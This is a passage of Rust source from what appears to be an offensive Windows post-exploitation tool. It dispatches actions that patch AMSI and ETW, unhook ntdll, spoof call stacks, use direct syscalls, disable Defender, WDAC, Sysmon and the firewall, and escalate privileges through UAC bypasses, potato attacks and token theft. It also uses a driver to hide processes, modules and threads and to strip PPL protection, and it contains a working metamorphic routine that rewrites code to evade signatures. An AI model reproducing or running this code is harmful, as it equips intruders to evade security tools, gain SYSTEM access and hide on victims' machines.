        "patch_amsi" => crate::evasion::amsi::amsi_bypass(args).map_err(|e| e.to_string()),
        "patch_cfg" => crate::evasion::cfg::cfg_bypass(args).map_err(|e| e.to_string()),
        "patch_cig" => crate::evasion::cfg::cig_bypass(args).map_err(|e| e.to_string()),

        // Unhooking
        "unhook_ntdll" => crate::evasion::unhook::unhook_ntdll(args).map_err(|e| e.to_string()),

        // Module operations
        "hide_module" => crate::evasion::unlink::unlink_module(args).map_err(|e| e.to_string()),
        "fluctuate_module" => {
            crate::evasion::fluctuation::module_fluctuation(args).map_err(|e| e.to_string())
        }

        // Sleep obfuscation
        "sleep_ekko" => {
            require_u64_param(args, "address", "stealth", "sleep_ekko")?;
            require_nonzero_usize_param(args, "size", "stealth", "sleep_ekko")?;
            crate::evasion::sleep::ekko_sleep(args).map_err(|e| e.to_string())
        }
        "sleep_foliage" => {
            require_u64_param(args, "address", "stealth", "sleep_foliage")?;
            require_nonzero_usize_param(args, "size", "stealth", "sleep_foliage")?;
            crate::evasion::sleep::foliage_sleep(args).map_err(|e| e.to_string())
        }
        "sleep_gargoyle" => {
            crate::evasion::gargoyle::gargoyle_sleep(args).map_err(|e| e.to_string())
        }
        "sleep_death" => {
            require_u64_param(args, "address", "stealth", "sleep_death")?;
            require_nonzero_usize_param(args, "size", "stealth", "sleep_death")?;
            crate::evasion::sleep::death_sleep(args).map_err(|e| e.to_string())
        }

        // Spoofing
        "spoof_callstack" => {
            require_u64_param(args, "shellcode_address", "stealth", "spoof_callstack")?;
            crate::evasion::sleep::spoof_callstack(args).map_err(|e| e.to_string())
        }
        "spoof_ppid" => crate::evasion::ppid::ppid_spoof(args).map_err(|e| e.to_string()),
        "spoof_return" => {
            crate::evasion::retspoof::return_address_spoof(args).map_err(|e| e.to_string())
        }
        "deep_stack_spoof" => {
            crate::evasion::retspoof::deep_stack_spoof(args).map_err(|e| e.to_string())
        }

        // Syscalls
        "syscall_write" => {
            let method = args
                .get("syscall_method")
                .and_then(|v| v.as_str())
                .unwrap_or("indirect");
            match method {
                "indirect" => {
                    crate::evasion::syscall::indirect_syscall_write(args).map_err(|e| e.to_string())
                }
                "direct" => {
                    crate::evasion::syscall::syscall_write_memory(args).map_err(|e| e.to_string())
                }
                "int2e" => crate::evasion::syscall::syscall_int2e(args).map_err(|e| e.to_string()),
                _ => Err(invalid_choice_error(
                    "stealth",
                    action,
                    "syscall_method",
                    method,
                    STEALTH_SYSCALL_METHODS,
                )),
            }
        }
        "syscall_alloc" => {
            let method = args
                .get("syscall_method")
                .and_then(|v| v.as_str())
                .unwrap_or("indirect");
            match method {
                "indirect" => {
                    crate::evasion::syscall::indirect_syscall_alloc(args).map_err(|e| e.to_string())
                }
                "direct" => {
                    crate::evasion::syscall::syscall_alloc_memory(args).map_err(|e| e.to_string())
                }
                "int2e" => crate::evasion::syscall::syscall_int2e(args).map_err(|e| e.to_string()),
                _ => Err(invalid_choice_error(
                    "stealth",
                    action,
                    "syscall_method",
                    method,
                    STEALTH_SYSCALL_METHODS,
                )),
            }
        }
        "syscall_protect" => {
            let method = args
                .get("syscall_method")
                .and_then(|v| v.as_str())
                .unwrap_or("indirect");
            match method {
                "indirect" => crate::evasion::syscall::indirect_syscall_protect(args)
                    .map_err(|e| e.to_string()),
                "direct" => {
                    crate::evasion::syscall::syscall_protect_memory(args).map_err(|e| e.to_string())
                }
                "int2e" => crate::evasion::syscall::syscall_int2e(args).map_err(|e| e.to_string()),
                _ => Err(invalid_choice_error(
                    "stealth",
                    action,
                    "syscall_method",
                    method,
                    STEALTH_SYSCALL_METHODS,
                )),
            }
        }
        "syscall_thread" => {
            let method = args
                .get("syscall_method")
                .and_then(|v| v.as_str())
                .unwrap_or("indirect");
            match method {
                "indirect" => crate::evasion::syscall::indirect_syscall_create_thread(args)
                    .map_err(|e| e.to_string()),
                "direct" => {
                    crate::evasion::syscall::syscall_create_thread(args).map_err(|e| e.to_string())
                }
                "int2e" => crate::evasion::syscall::syscall_int2e(args).map_err(|e| e.to_string()),
                _ => Err(invalid_choice_error(
                    "stealth",
                    action,
                    "syscall_method",
                    method,
                    STEALTH_SYSCALL_METHODS,
                )),
            }
        }
        "syscall_open" => {
            crate::evasion::syscall::indirect_syscall_open_process(args).map_err(|e| e.to_string())
        }
        "syscall_read" => {
            crate::evasion::syscall::indirect_syscall_read(args).map_err(|e| e.to_string())
        }
        "syscall_query" => {
            crate::evasion::syscall::indirect_syscall_query(args).map_err(|e| e.to_string())
        }
        "syscall_close" => {
            crate::evasion::syscall::indirect_syscall_close(args).map_err(|e| e.to_string())
        }
        "syscall_free" => {
            crate::evasion::syscall::indirect_syscall_free(args).map_err(|e| e.to_string())
        }
        "syscall_stealth_read" => {
            crate::evasion::syscall::indirect_syscall_stealth_read(args).map_err(|e| e.to_string())
        }
        "syscall_inject" => {
            crate::evasion::syscall::indirect_syscall_inject(args).map_err(|e| e.to_string())
        }

        // Self-protection
        "encrypt_memory" => {
            if let Some(pid) = parse_u64_arg(args.get("pid")) {
                if pid != std::process::id() as u64 {
                    return Err(
                        "stealth(action='encrypt_memory') only supports local memory in the memoric process. Do not pass a remote PID/address; allocate or identify a local self-protection region first.".to_string()
                    );
                }
            }
            let address = require_u64_param(args, "address", "stealth", "encrypt_memory")? as usize;
            let size = require_nonzero_usize_param(args, "size", "stealth", "encrypt_memory")?;
            crate::bruteforce::self_protect::encrypt_region(address, size)
                .map_err(|e| e.to_string())
        }
        "decrypt_memory" => {
            if let Some(pid) = parse_u64_arg(args.get("pid")) {
                if pid != std::process::id() as u64 {
                    return Err(
                        "stealth(action='decrypt_memory') only supports local memory previously encrypted in the memoric process. Do not pass a remote PID/address.".to_string()
                    );
                }
            }
            let address = require_u64_param(args, "address", "stealth", "decrypt_memory")? as usize;
            crate::bruteforce::self_protect::decrypt_region(address).map_err(|e| e.to_string())
        }
        "mutate_code" => mutate_code(args),

        // Sysmon blinding
        "sysmon_blind" => {
            let mut sysmon_args = args.clone();
            if let Some(m) = args.get("sysmon_method") {
                sysmon_args
                    .as_object_mut()
                    .map(|obj| obj.insert("method".to_string(), m.clone()));
            }
            crate::evasion::sysmon::sysmon_blind(&sysmon_args).map_err(|e| e.to_string())
        }

        // Timestomping
        "timestomp" => crate::evasion::timestomp::timestomp(args).map_err(|e| e.to_string()),

        // Advanced unhooking
        "unhook_function" => {
            crate::evasion::unhook::patch_single_function(args).map_err(|e| e.to_string())
        }

        // Advanced ETW control
        "etw_provider_disable" => {
            crate::evasion::etw::etw_provider_disable(args).map_err(|e| e.to_string())
        }
        "etw_mass_disable" => {
            crate::evasion::edr::etw_mass_disable(args).map_err(|e| e.to_string())
        }

        // Advanced module operations
        "module_stomp" => {
            crate::evasion::fluctuation::module_stomp(args).map_err(|e| e.to_string())
        }

        // Suspended thread helper
        "create_suspended" => {
            crate::evasion::sleep::create_suspended_thread(args).map_err(|e| e.to_string())
        }

        // Test signing bypass (usermode hooks)
        "testsign_hide_ntquery" => {
            crate::evasion::testsign::testsign_hide_ntquery(args).map_err(|e| e.to_string())
        }
        "testsign_hide_self" => {
            crate::evasion::testsign::testsign_hide_self(args).map_err(|e| e.to_string())
        }
        "testsign_hide_bcd" => {
            crate::evasion::testsign::testsign_hide_bcd(args).map_err(|e| e.to_string())
        }
        "testsign_query" => {
            crate::evasion::testsign::testsign_query(args).map_err(|e| e.to_string())
        }
        "testsign_auto_inject" => {
            crate::evasion::testsign::testsign_auto_inject(args).map_err(|e| e.to_string())
        }
        "testsign_launch_hooked" => {
            crate::evasion::testsign::testsign_launch_hooked(args).map_err(|e| e.to_string())
        }
        "testsign_kernel_bypass" => {
            crate::evasion::testsign::testsign_kernel_bypass(args).map_err(|e| e.to_string())
        }
        "testsign_launch_clean" => {
            crate::evasion::testsign::testsign_launch_clean(args).map_err(|e| e.to_string())
        }
        "testsign_ci_callback" => {
            crate::evasion::testsign::testsign_ci_callback_bypass(args).map_err(|e| e.to_string())
        }
        "testsign_ci_func_patch" => {
            crate::evasion::testsign::testsign_ci_func_patch(args).map_err(|e| e.to_string())
        }
        "testsign_pte_rw" => {
            crate::evasion::testsign::testsign_pte_rw(args).map_err(|e| e.to_string())
        }

        // WDAC disable / restore
        "wdac_disable" => crate::evasion::wdac::wdac_disable(args).map_err(|e| e.to_string()),
        "wdac_restore" => crate::evasion::wdac::wdac_restore(args).map_err(|e| e.to_string()),

        // Defender deep manipulation
        "defender_disable" => {
            crate::evasion::defender::defender_disable(args).map_err(|e| e.to_string())
        }
        "defender_restore" => {
            crate::evasion::defender::defender_restore(args).map_err(|e| e.to_string())
        }
        "defender_status" => {
            crate::evasion::defender::defender_status(args).map_err(|e| e.to_string())
        }
        "defender_add_exclusion" => {
            crate::evasion::defender::defender_add_exclusion(args).map_err(|e| e.to_string())
        }
        "defender_mpcmdrun" => {
            crate::evasion::defender::defender_mpcmdrun(args).map_err(|e| e.to_string())
        }

        // Firewall rule manipulation
        "firewall_add_rule" => {
            crate::evasion::firewall::firewall_add_rule(args).map_err(|e| e.to_string())
        }
        "firewall_remove_rule" => {
            crate::evasion::firewall::firewall_remove_rule(args).map_err(|e| e.to_string())
        }
        "firewall_list_rules" => {
            crate::evasion::firewall::firewall_list_rules(args).map_err(|e| e.to_string())
        }
        "firewall_disable" => {
            crate::evasion::firewall::firewall_disable(args).map_err(|e| e.to_string())
        }
        "firewall_enable" => {
            crate::evasion::firewall::firewall_enable(args).map_err(|e| e.to_string())
        }
        "firewall_status" => {
            crate::evasion::firewall::firewall_status(args).map_err(|e| e.to_string())
        }

        // Sentinel persistence engine
        "sentinel_start" => {
            crate::evasion::sentinel::sentinel_start(args).map_err(|e| e.to_string())
        }
        "sentinel_stop" => crate::evasion::sentinel::sentinel_stop(args).map_err(|e| e.to_string()),
        "sentinel_status" => {
            crate::evasion::sentinel::sentinel_status(args).map_err(|e| e.to_string())
        }
        "sentinel_self_destruct" => {
            crate::evasion::sentinel::sentinel_self_destruct(args).map_err(|e| e.to_string())
        }

        // Phase 3.5: Kernel callback precision strike
        "callback_enum_by_driver" => {
            crate::evasion::callback_ops::callback_enum_by_driver(args).map_err(|e| e.to_string())
        }
        "callback_masquerade" => {
            crate::evasion::callback_ops::callback_masquerade(args).map_err(|e| e.to_string())
        }
        "etw_ti_selective_disable" => {
            crate::evasion::callback_ops::etw_ti_selective_disable(args).map_err(|e| e.to_string())
        }

        // Phase 3.6: Minifilter enhancement
        "minifilter_enum_classified" => {
            crate::evasion::callback_ops::minifilter_enum_classified(args)
                .map_err(|e| e.to_string())
        }
        "minifilter_selective_detach" => {
            crate::evasion::callback_ops::minifilter_selective_detach(args)
                .map_err(|e| e.to_string())
        }
        "minifilter_pause" => {
            crate::evasion::callback_ops::minifilter_pause(args).map_err(|e| e.to_string())
        }
        "minifilter_resume" => {
            crate::evasion::callback_ops::minifilter_resume(args).map_err(|e| e.to_string())
        }

        _ => Err(unknown_action_error("stealth", action, STEALTH_ACTIONS)),
    }
}

/// Metamorphic code mutation — applies random transformations to executable code in-memory
/// to change its byte signature while preserving functionality.
///
/// Techniques:
/// 1. NOP sled insertion (multi-byte NOPs for stealth)
/// 2. Dead code insertion (junk instructions that don't affect state)
/// 3. Equivalent instruction substitution (e.g. xor rax,rax → sub rax,rax)
/// 4. Register reassignment where possible
fn mutate_code(args: &Value) -> Result<Value, String> {
    let address = require_u64_param(args, "address", "stealth", "mutate_code")?;
    let size = require_u64_param(args, "size", "stealth", "mutate_code")? as usize;
    let intensity = args
        .get("intensity")
        .and_then(|v| v.as_u64())
        .unwrap_or(1)
        .min(3) as u8;

    if size == 0 || size > 0x10000 {
        return Err(invalid_param_error(
            "stealth",
            "mutate_code",
            "size",
            "expected 1..65536 bytes",
        ));
    }

    unsafe {
        use windows::Win32::System::Memory::{
            VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
        };

        let mem = address as *mut u8;

        // 1. Make writable
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(mem as *const _, size, PAGE_READWRITE, &mut old_protect)
            .map_err(|e| format!("VirtualProtect RW: {}", e))?;

        let code = std::slice::from_raw_parts_mut(mem, size);
        let mut mutations = 0u32;

        // Simple PRNG seeded from TSC
        let mut rng: u64 = std::arch::x86_64::_rdtsc();
        let next_rng = |state: &mut u64| -> u64 {
            *state ^= *state << 13;
            *state ^= *state >> 7;
            *state ^= *state << 17;
            *state
        };

        // Scan for mutable patterns and apply substitutions
        let mut i = 0;
        while i < code.len().saturating_sub(2) {
            let rand_val = next_rng(&mut rng);

            // Only mutate at probability proportional to intensity
            if (rand_val % 4) >= intensity as u64 {
                i += 1;
                continue;
            }

            // Pattern: xor reg, reg (REX.W + 0x31/0x33) → sub reg, reg
            // 48 31 C0 (xor rax,rax) → 48 29 C0 (sub rax,rax)
            // 48 33 C0 (xor rax,rax) → 48 2B C0 (sub rax,rax)
            if i + 2 < code.len() && code[i] == 0x48 && (code[i + 1] == 0x31 || code[i + 1] == 0x33)
            {
                let modrm = code[i + 2];
                let rm = modrm & 0x07;
                let reg = (modrm >> 3) & 0x07;
                if reg == rm {
                    // xor reg,reg → sub reg,reg  (equivalent zeroing)
                    code[i + 1] = if code[i + 1] == 0x31 { 0x29 } else { 0x2B };
                    mutations += 1;
                    i += 3;
                    continue;
                }
            }

            // sub reg,reg → xor reg,reg (reverse of above)
            if i + 2 < code.len() && code[i] == 0x48 && (code[i + 1] == 0x29 || code[i + 1] == 0x2B)
            {
                let modrm = code[i + 2];
                let rm = modrm & 0x07;
                let reg = (modrm >> 3) & 0x07;
                if reg == rm {
                    code[i + 1] = if code[i + 1] == 0x29 { 0x31 } else { 0x33 };
                    mutations += 1;
                    i += 3;
                    continue;
                }
            }

            // Pattern: single-byte NOP (0x90) → multi-byte NOP equivalent
            if code[i] == 0x90 {
                // Replace with 66 NOP (if space)
                if i + 1 < code.len() && code[i + 1] == 0x90 {
                    // 2-byte NOP: 66 90
                    code[i] = 0x66;
                    code[i + 1] = 0x90;
                    mutations += 1;
                    i += 2;
                    continue;
                }
            }

            // Pattern: mov reg, imm (48 C7 C0 xx xx xx xx) when imm == 0 → xor reg, reg
            if i + 6 < code.len() && code[i] == 0x48 && code[i + 1] == 0xC7 {
                let modrm = code[i + 2];
                if (modrm & 0xF8) == 0xC0 {
                    let imm =
                        u32::from_le_bytes([code[i + 3], code[i + 4], code[i + 5], code[i + 6]]);
                    if imm == 0 {
                        let reg = modrm & 0x07;
                        // 48 C7 C0 00 00 00 00 (7 bytes) → 48 31 C0 90 90 90 90 (3 bytes + 4 NOPs)
                        code[i] = 0x48;
                        code[i + 1] = 0x31;
                        code[i + 2] = 0xC0 | (reg << 3) | reg; // xor reg, reg
                        code[i + 3] = 0x90;
                        code[i + 4] = 0x90;
                        code[i + 5] = 0x90;
                        code[i + 6] = 0x90;
                        mutations += 1;
                        i += 7;
                        continue;
                    }
                }
            }

            // Pattern: test reg, reg → and reg, reg (equivalent for ZF)
            // 48 85 C0 (test rax,rax) → 48 21 C0 (and rax,rax)
            if i + 2 < code.len() && code[i] == 0x48 && code[i + 1] == 0x85 {
                code[i + 1] = 0x21;
                mutations += 1;
                i += 3;
                continue;
            }

            // and reg,reg → test reg,reg (reverse)
            if i + 2 < code.len() && code[i] == 0x48 && code[i + 1] == 0x21 {
                let modrm = code[i + 2];
                let rm = modrm & 0x07;
                let reg = (modrm >> 3) & 0x07;
                if reg == rm {
                    code[i + 1] = 0x85;
                    mutations += 1;
                    i += 3;
                    continue;
                }
            }

            i += 1;
        }

        // 2. Restore execute
        VirtualProtect(mem as *const _, size, PAGE_EXECUTE_READ, &mut old_protect)
            .map_err(|e| format!("VirtualProtect RX: {}", e))?;

        Ok(json!({
            "success": true,
            "technique": "metamorphic_mutation",
            "address": format!("0x{:016X}", address),
            "size": size,
            "mutations_applied": mutations,
            "intensity": intensity,
            "message": format!("{} equivalent-instruction substitutions applied. Code signature changed, functionality preserved.", mutations)
        }))
    }
}

fn handle_detect(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "detect", DETECT_ACTIONS)?;

    match action {
        // EDR detection
        "edr_products" => crate::evasion::edr::detect_edr_products(args).map_err(|e| e.to_string()),
        "edr_hooks" => crate::evasion::edr::scan_inline_hooks(args).map_err(|e| e.to_string()),
        "edr_quick_check" => crate::evasion::edr::quick_hook_check(args).map_err(|e| e.to_string()),
        "edr_suspend" => {
            crate::evasion::edr::suspend_edr_processes(args).map_err(|e| e.to_string())
        }

        // System detection
        "etw_sessions" => {
            crate::evasion::edr::enumerate_etw_sessions(args).map_err(|e| e.to_string())
        }
        "veh_chain" => crate::evasion::edr::detect_veh_chain(args).map_err(|e| e.to_string()),
        "vm_sandbox" => crate::evasion::antivm::detect_vm(args).map_err(|e| e.to_string()),
        "hypervisor" => {
            crate::evasion::hypervisor::detect_hypervisor(args).map_err(|e| e.to_string())
        }

        // Hooks check
        "hooks" => {
            if args.get("function_name").is_some() {
                tracing::warn!("detect(action='hooks', function_name=...) is deprecated, use action='hook_function'");
                crate::evasion::edr::detect_hook_on_function(args).map_err(|e| e.to_string())
            } else {
                crate::evasion::edr::scan_inline_hooks(args).map_err(|e| e.to_string())
            }
        }
        "hook_function" => {
            require_str_param(
                args,
                "function_name",
                "detect",
                "hook_function",
                Some("Provide the exported or symbol name to inspect, e.g. function_name='NtOpenProcess'."),
            )?;
            crate::evasion::edr::detect_hook_on_function(args).map_err(|e| e.to_string())
        }

        // Forensics detection (from bruteforce)
        "forensics" => {
            crate::bruteforce::anti_forensics::detect_forensic_tools().map_err(|e| e.to_string())
        }
        "integrity" => {
            crate::bruteforce::anti_forensics::check_system_integrity().map_err(|e| e.to_string())
        }

        // Syscall database
        "syscall_resolve" => {
            let normalized = normalize_alias(
                args,
                "function_name",
                "function",
                "detect",
                "syscall_resolve",
            );
            require_str_param(
                &normalized,
                "function_name",
                "detect",
                "syscall_resolve",
                Some(
                    "Provide the Nt/Zw export name to resolve, e.g. function_name='NtOpenProcess'.",
                ),
            )?;
            crate::evasion::syscall::resolve_syscall_number(&normalized).map_err(|e| e.to_string())
        }

        // Stealth scoring
        "stealth_score" => {
            crate::evasion::stealth_score::assess_stealth_posture(args).map_err(|e| e.to_string())
        }

        // Bypass recommendations
        "bypass_recommendations" => {
            crate::bypass_db::bypass_recommendations(args).map_err(|e| e.to_string())
        }

        _ => Err(unknown_action_error("detect", action, DETECT_ACTIONS)),
    }
}

fn handle_privilege(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "privilege", PRIVILEGE_ACTIONS)?;

    match action {
        // Elevation
        "elevate" => {
            let method = args
                .get("method")
                .and_then(|v| v.as_str())
                .unwrap_or("auto");
            match method {
                "auto" => crate::privilege::auto::auto_elevate(args).map_err(|e| e.to_string()),
                "fodhelper" => {
                    crate::privilege::uac::fodhelper_bypass(args).map_err(|e| e.to_string())
                }
                "eventvwr" => {
                    crate::privilege::uac::eventvwr_bypass(args).map_err(|e| e.to_string())
                }
                "computerdefaults" => {
                    crate::privilege::uac::computerdefaults_bypass(args).map_err(|e| e.to_string())
                }
                "sdclt" => crate::privilege::uac::sdclt_bypass(args).map_err(|e| e.to_string()),
                "disk_cleanup" => {
                    crate::privilege::uac::disk_cleanup_bypass(args).map_err(|e| e.to_string())
                }
                "mock_trusted_dir" => {
                    crate::privilege::uac::mock_trusted_dir_bypass(args).map_err(|e| e.to_string())
                }
                "request_uac" => {
                    crate::privilege::uac::request_elevation(args).map_err(|e| e.to_string())
                }
                "system" => {
                    crate::privilege::system::elevate_to_system(args).map_err(|e| e.to_string())
                }
                _ => Err(invalid_choice_error(
                    "privilege",
                    "elevate",
                    "method",
                    method,
                    PRIVILEGE_ELEVATE_METHODS,
                )),
            }
        }

        // Token operations
        "token_steal" => {
            let normalized = normalize_alias(args, "target_pid", "pid", "privilege", "token_steal");
            crate::privilege::token::steal_token(&normalized).map_err(|e| e.to_string())
        }
        "token_impersonate" => {
            let normalized =
                normalize_alias(args, "target_pid", "pid", "privilege", "token_impersonate");
            crate::privilege::token::impersonate_process(&normalized).map_err(|e| e.to_string())
        }
        "token_revert" => crate::privilege::token::revert_to_self(args).map_err(|e| e.to_string()),
        "token_scan" => {
            let normalized = normalize_alias(args, "target_pid", "pid", "privilege", "token_scan");
            crate::privilege::token::scan_token_targets(&normalized).map_err(|e| e.to_string())
        }

        // Debug privilege
        "debug_priv" => crate::privilege::enable_debug_privilege(args).map_err(|e| e.to_string()),

        // Check status
        "check" => {
            let detail = args
                .get("detail")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let admin = crate::privilege::uac::is_admin().map_err(|e| e.to_string())?;
            let uac = crate::privilege::check_uac_status(&json!({})).map_err(|e| e.to_string())?;

            if detail {
                let privs = crate::redteam::get_system_privileges(&json!({}))
                    .unwrap_or(json!({"error": "failed"}));
                Ok(json!({"is_admin": admin, "uac": uac, "privileges": privs}))
            } else {
                Ok(json!({"is_admin": admin, "uac": uac}))
            }
        }

        // Potato attacks (named pipe impersonation)
        "potato" => {
            let method = args
                .get("method")
                .and_then(|v| v.as_str())
                .unwrap_or("print_spoofer");
            require_str_param(
                args,
                "command",
                "privilege",
                "potato",
                Some("Provide the command to run after privilege escalation."),
            )?;
            match method {
                "print_spoofer" => {
                    crate::privilege::potato::print_spoofer(args).map_err(|e| e.to_string())
                }
                "god_potato" => {
                    crate::privilege::potato::god_potato(args).map_err(|e| e.to_string())
                }
                "efs_potato" => {
                    crate::privilege::potato::efs_potato(args).map_err(|e| e.to_string())
                }
                _ => Err(invalid_choice_error(
                    "privilege",
                    "potato",
                    "method",
                    method,
                    PRIVILEGE_POTATO_METHODS,
                )),
            }
        }

        // Service abuse
        "service_unquoted" => {
            crate::privilege::service::unquoted_service_path(args).map_err(|e| e.to_string())
        }
        "service_weak_perms" => {
            crate::privilege::service::weak_service_permissions(args).map_err(|e| e.to_string())
        }
        "service_always_elevated" => {
            crate::privilege::service::always_install_elevated(args).map_err(|e| e.to_string())
        }

        // Symlink attack
        "symlink" => {
            require_str_param(
                args,
                "link_path",
                "privilege",
                "symlink",
                Some("Provide the link path to create, e.g. link_path='C:\\temp\\bait'."),
            )?;
            require_str_param(
                args,
                "target_path",
                "privilege",
                "symlink",
                Some("Provide the target path the link should point to."),
            )?;
            crate::privilege::symlink::symlink_attack(args).map_err(|e| e.to_string())
        }

        _ => Err(unknown_action_error("privilege", action, PRIVILEGE_ACTIONS)),
    }
}

/// Try memoric custom driver for kernel ops; fall back to generic BYOVD if not available.
fn memoric_driver_or_byovd(args: &Value, action: &str) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    // If explicit device_path is provided, use BYOVD path
    if args.get("device_path").and_then(|v| v.as_str()).is_some() {
        return match action {
            "token_escalate" => {
                crate::kernel::kernel_token_escalate(args).map_err(|e| e.to_string())
            }
            "dkom_hide" => crate::kernel::dkom_hide_process(args).map_err(|e| e.to_string()),
            "ppl_bypass" => crate::kernel::ppl_bypass(args).map_err(|e| e.to_string()),
            _ => Err(format!("Unknown action: {}", action)),
        };
    }

    // Try memoric custom driver first, auto-installing embedded memoric.sys if needed
    let drv = MemoricDriver::ensure().map_err(|e| {
        format!(
            "{}: failed to ensure memoric.sys automatically: {}. If you want BYOVD fallback, provide device_path/read_ioctl/write_ioctl.",
            action, e
        )
    })?;

    let pid = require_u64_param(args, "pid", "kernel", action)? as u32;

    match action {
        "token_escalate" => {
            // Get EPROCESS info for both system and target
            let sys_info = drv.get_eprocess(4).map_err(|e| e.to_string())?;
            let tgt_info = drv.get_eprocess(pid).map_err(|e| e.to_string())?;

            // Steal SYSTEM token → target
            drv.token_steal(4, pid).map_err(|e| e.to_string())?;

            // Read back to verify
            let verify = drv.get_eprocess(pid).map_err(|e| e.to_string())?;

            Ok(serde_json::json!({
                "success": true,
                "technique": "memoric_driver_token_steal",
                "driver": "memoric.sys (custom)",
                "pid": pid,
                "target_eprocess": format!("0x{:016X}", tgt_info.eprocess_address),
                "system_eprocess": format!("0x{:016X}", sys_info.eprocess_address),
                "original_token": format!("0x{:016X}", tgt_info.token),
                "system_token": format!("0x{:016X}", sys_info.token),
                "new_token": format!("0x{:016X}", verify.token),
                "token_replaced": (verify.token & !0xF) == (sys_info.token & !0xF),
                "target_image": tgt_info.image_name(),
                "message": format!("PID {} ({}) token replaced with SYSTEM token via memoric.sys — process is now NT AUTHORITY\\SYSTEM!", pid, tgt_info.image_name())
            }))
        }
        "dkom_hide" => {
            let info = drv.get_eprocess(pid).map_err(|e| e.to_string())?;
            drv.dkom_hide(pid).map_err(|e| e.to_string())?;

            Ok(serde_json::json!({
                "success": true,
                "technique": "memoric_driver_dkom_hide",
                "driver": "memoric.sys (custom)",
                "pid": pid,
                "eprocess": format!("0x{:016X}", info.eprocess_address),
                "image_name": info.image_name(),
                "message": format!("PID {} ({}) unlinked from ActiveProcessLinks — invisible to Task Manager, EnumProcesses, most EDR!", pid, info.image_name())
            }))
        }
        "ppl_bypass" => {
            let info = drv.get_eprocess(pid).map_err(|e| e.to_string())?;
            drv.ppl_remove(pid).map_err(|e| e.to_string())?;

            Ok(serde_json::json!({
                "success": true,
                "technique": "memoric_driver_ppl_remove",
                "driver": "memoric.sys (custom)",
                "pid": pid,
                "eprocess": format!("0x{:016X}", info.eprocess_address),
                "image_name": info.image_name(),
                "protection_offset": format!("0x{:X}", info.protection_off),
                "message": format!("PID {} ({}) PS_PROTECTION zeroed — PPL removed!", pid, info.image_name())
            }))
        }
        _ => Err(format!("Unknown action: {}", action)),
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Native memoric.sys IOCTL handlers
// ═════════════════════════════════════════════════════════════════════════════

fn driver_enum_process(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let max = args
        .get("max_entries")
        .and_then(|v| v.as_u64())
        .unwrap_or(512) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv.enum_processes(max).map_err(|e| e.to_string())?;

    let procs: Vec<Value> = entries
        .iter()
        .map(|e| {
            serde_json::json!({
                "pid": e.process_id,
                "ppid": e.parent_process_id,
                "eprocess": format!("0x{:016X}", e.eprocess_address),
                "token": format!("0x{:016X}", e.token),
                "dtb": format!("0x{:016X}", e.directory_table_base),
                "name": e.image_name(),
                "protection": e.protection,
            })
        })
        .collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_enum_process",
        "driver": "memoric.sys",
        "count": procs.len(),
        "processes": procs,
        "message": format!("Enumerated {} processes from kernel ActiveProcessLinks (ground truth, invisible to usermode hooks)", procs.len())
    }))
}

fn driver_module_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let name = require_str_param(
        args,
        "driver_name",
        "kernel",
        "driver_module_hide",
        Some("Example: driver_name='memoric.sys'."),
    )?;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.module_hide(name).map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_module_hide",
        "driver": "memoric.sys",
        "hidden_module": name,
        "message": format!("'{}' unlinked from PsLoadedModuleList — invisible to NtQuerySystemInformation, EnumDeviceDrivers, most rootkit scanners", name)
    }))
}

fn driver_thread_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let tid = require_u64_param(args, "thread_id", "kernel", "driver_thread_hide")? as u32;
    let pid = require_u64_param(args, "pid", "kernel", "driver_thread_hide")? as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.thread_hide(tid, pid).map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_thread_hide",
        "driver": "memoric.sys",
        "thread_id": tid,
        "process_id": pid,
        "message": format!("Thread {} unlinked from PID {} thread list — invisible to thread enumeration", tid, pid)
    }))
}

fn driver_callback_enum(args: &Value) -> Result<Value, String> {
    use crate::driver::{
        MemoricDriver, CALLBACK_TYPE_IMAGE, CALLBACK_TYPE_PROCESS, CALLBACK_TYPE_THREAD,
    };

    let type_str = args
        .get("callback_type")
        .and_then(|v| v.as_str())
        .unwrap_or("process");
    let max = args
        .get("max_entries")
        .and_then(|v| v.as_u64())
        .unwrap_or(64) as u32;

    let cb_type = match type_str {
        "process" => CALLBACK_TYPE_PROCESS,
        "thread" => CALLBACK_TYPE_THREAD,
        "image" | "load_image" => CALLBACK_TYPE_IMAGE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_callback_enum",
                "callback_type",
                type_str,
                "process, thread, image",
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv.callback_enum(cb_type, max).map_err(|e| e.to_string())?;

    let callbacks: Vec<Value> = entries
        .iter()
        .map(|e| {
            serde_json::json!({
                "address": format!("0x{:016X}", e.callback_address),
                "index": e.index,
                "type": e.callback_type,
                "driver": e.driver_name_str(),
            })
        })
        .collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_callback_enum",
        "driver": "memoric.sys",
        "callback_type": type_str,
        "count": callbacks.len(),
        "callbacks": callbacks,
        "message": format!("Enumerated {} {} callbacks from kernel callback arrays (direct kernel memory scan)", callbacks.len(), type_str)
    }))
}

fn driver_callback_remove(args: &Value) -> Result<Value, String> {
    use crate::driver::{
        MemoricDriver, CALLBACK_TYPE_IMAGE, CALLBACK_TYPE_PROCESS, CALLBACK_TYPE_THREAD,
    };

    let type_str = require_str_param(
        args,
        "callback_type",
        "kernel",
        "driver_callback_remove",
        Some("Use one of: process, thread, image."),
    )?;
